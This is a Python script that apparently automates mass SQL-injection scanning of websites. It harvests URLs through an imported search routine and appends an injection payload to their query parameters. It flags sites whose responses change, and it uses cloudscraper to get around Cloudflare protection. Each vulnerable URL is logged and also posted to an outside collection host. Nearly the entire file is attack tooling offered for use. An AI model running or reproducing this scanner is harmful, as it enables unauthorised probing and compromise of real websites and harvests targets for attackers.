import cloudscraper
import requests
from time import sleep as t
from hhh import *
print("rrrrrrrrrrrrrrrrrrr")
scraper = cloudscraper.create_scraper()  
print('Omar_Style....')
def Updates(): # المختصر هذه الفنكشن تقوم بفحص الانترنت
    try:
        r = scraper.get("https://www.google.com/")
        return True
    except:
          return False
# print(Updates())
# exit()
def url_Fuhais(url_if):  # 200 or 404 فحص الرابط  # Link Check
    try:
        r = scraper.get(url_if).status_code
        if r == 200:
            return True
        else:
            return r
    except:
          return False

def file_if(url):#File search # بحث في الملف
    with open('SQL.txt','r') as my: 
        mm=my.readlines()
    n = "\n"
    b = url+n
    if b in mm:
        return True
    else:
        return False



def Download_link(link):#Download link in file  # تنزيل الرابط في ملف
    file = open("SQL.txt","a")
    file.write(link+"\n")
    file.close()

def Download_link_url(link):#Download link in file  # تنزيل الرابط في ملف
    file = open("url.txt","a")
    file.write(link+"\n")
    file.close()

def SQL_omar(ulr_n):
    try:
        n = scraper.get(ulr_n).text
        r = scraper.get(ulr_n+"'' or -- -'").text
        t(8)

        if len(r) != len(n):
            Download_link(ulr_n)
            print(f'Saved to a file => {ulr_n}')
            v = {"om":ulr_n}
            r = requests.post("https://sylphy-week.000webhostapp.com/omar.php",data=v)
            print(r.text)
            #############################################
            u = ulr_n.split('/')[2]
            Download_link_url(u)
        else:
            pass
            # print(f"EEE===> {ulr_n}")
    except:
        pass
###############
def phl (url):  #File search # بحث في الملف
    with open('url.txt','r') as my: 
        mm=my.readlines()
    n = "\n"
    b = url.split('/')[2]
    m = b+n
    if m in mm:
        return True
    else:
        return False
# print(phl('https://www.wirelesslogic.com/iot-glossary/what-is-cat-1/'))

################
def ph (url_mysql):
    Fileoffline = open("A.txt",'r')
    Lines=Fileoffline.readlines()
    for i in Lines:
        lu = i.rstrip('\n')
        url =(f"{url_mysql}{lu}")
        print("ooooooooooooooooooooooooooooooooooooo")
        if Updates():
            if phl(url):
                print('====popopopopo')
                compile
            else:
                print(f'===> {url}')
                SQL_omar(url)
        else: 
            print ("==> there is no Internet")
            exit()


        # if file_if(url):
        #     print('okm <=')
        # else:
        #     SQL_omar(url)
   
#####################
#####################

#####################
while True:
    t(1)
    print('mm')
    An = Omar()
    An.google_se()
    print("=================================================================")
    with open('url_SQL.txt','r') as my:
        mm=my.readlines()
        for m in mm:
            url_mysql = m.rstrip('\n')
            # print(url_mysql)
            #######1
            if '=' in url_mysql:
                # print(url_mysql)
                m1 = url_mysql.split('=')[0]
                ulr_n = (m1+"=1")
                print(ulr_n)
                if file_if(ulr_n):
                    # print('This link exists') #هذا الرابط موجود
                    compile
                else:     
                    if Updates():
                        if url_Fuhais(ulr_n) == 404:
                            print ("404 <===")
                        elif url_Fuhais(ulr_n) == True:
                            print('url ok')
                            SQL_omar(ulr_n)
                        elif url_Fuhais(ulr_n) == False:
                            # pass
                            print('url Eeeeol')
                            #print(url_Fuhais(ulr_n))
                            #print(m1)
                    else:
                        print ("==> there is no Internet")
                        exit()
            else:
                ur = url_mysql
                if file_if(ur):
                    # print('This link exists') #هذا الرابط موجود
                    compile
                else:  
                    if Updates():
                        if url_Fuhais(ur) == 404:
                            print ("404 <===")
                        elif url_Fuhais(ur) == True:
                            print('url nnn ok')
                            ph(ur)
                        elif url_Fuhais(ur) == False:
                            # pass
                            print('url Eeeeol')
                            # print(url_Fuhais(ulr_n))
                            # print(ur)
                    else:
                        print ("==> there is no Internet")
                        exit()
            
 
